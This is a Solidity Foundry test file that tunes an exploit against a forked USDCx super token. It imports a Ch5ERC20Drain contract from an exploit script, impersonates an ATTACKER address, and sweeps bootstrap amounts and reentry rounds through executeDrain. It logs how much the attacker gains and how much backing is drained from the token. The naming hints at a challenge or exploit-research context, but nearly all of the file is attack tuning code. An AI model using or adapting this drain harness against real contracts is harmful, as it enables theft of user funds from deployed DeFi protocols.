// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import {Ch5ERC20Drain} from "../exploit/Run.s.sol";

interface IERC20View45 {
    function balanceOf(address account) external view returns (uint256);
}

interface ISuperTokenView45 {
    function getUnderlyingToken() external view returns (address);
}

/// @notice Parameter sweep for the live-fork USDCx continuation.
contract Attempt45USDCXHelperTuneTest is Test {
    address internal constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;
    address internal constant USDCX = 0xCAa7349CEA390F89641fe306D93591f87595dc1F;
    address internal constant ROUTER = 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff;

    uint256 internal constant MAX_REENTRY_COUNT = 10;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    function test_tune_usdc_helper_parameters() public {
        uint256[] memory bootstraps = new uint256[](8);
        bootstraps[0] = 100 ether;
        bootstraps[1] = 250 ether;
        bootstraps[2] = 500 ether;
        bootstraps[3] = 1_000 ether;
        bootstraps[4] = 2_000 ether;
        bootstraps[5] = 5_000 ether;
        bootstraps[6] = 10_000 ether;
        bootstraps[7] = 20_000 ether;

        uint256[] memory rounds = new uint256[](4);
        rounds[0] = 1;
        rounds[1] = 2;
        rounds[2] = 3;
        rounds[3] = 4;

        for (uint256 i = 0; i < bootstraps.length; ++i) {
            for (uint256 j = 0; j < rounds.length; ++j) {
                uint256 snap = vm.snapshotState();
                _probe(bootstraps[i], rounds[j]);
                vm.revertToState(snap);
            }
        }
    }

    function _probe(uint256 bootstrapNative, uint256 maxRounds) internal {
        address underlying = ISuperTokenView45(USDCX).getUnderlyingToken();
        uint256 nativeBefore = ATTACKER.balance;
        uint256 backingBefore = IERC20View45(underlying).balanceOf(USDCX);

        vm.startPrank(ATTACKER);
        Ch5ERC20Drain drain = new Ch5ERC20Drain(USDCX, ROUTER, 620_000_000 + uint32(maxRounds * 1000), address(0));
        try drain.executeDrain{value: bootstrapNative}(maxRounds, MAX_REENTRY_COUNT) returns (
            uint256 roundsExecuted,
            uint256 nativeOut
        ) {
            uint256 nativeAfter = ATTACKER.balance;
            uint256 backingAfter = IERC20View45(underlying).balanceOf(USDCX);
            console.log("SUCCESS bootstrap:", bootstrapNative);
            console.log("SUCCESS rounds:", maxRounds);
            console.log("SUCCESS rounds executed:", roundsExecuted);
            console.log("SUCCESS native out:", nativeOut);
            console.log("SUCCESS native delta:", nativeAfter - nativeBefore);
            console.log("SUCCESS backing delta:", backingBefore - backingAfter);
        } catch Error(string memory reason) {
            console.log("ERROR bootstrap:", bootstrapNative);
            console.log("ERROR rounds:", maxRounds);
            console.log("ERROR reason:", reason);
        } catch (bytes memory data) {
            console.log("LOWLEVEL bootstrap:", bootstrapNative);
            console.log("LOWLEVEL rounds:", maxRounds);
            console.logBytes(data);
        }
        vm.stopPrank();
    }
}
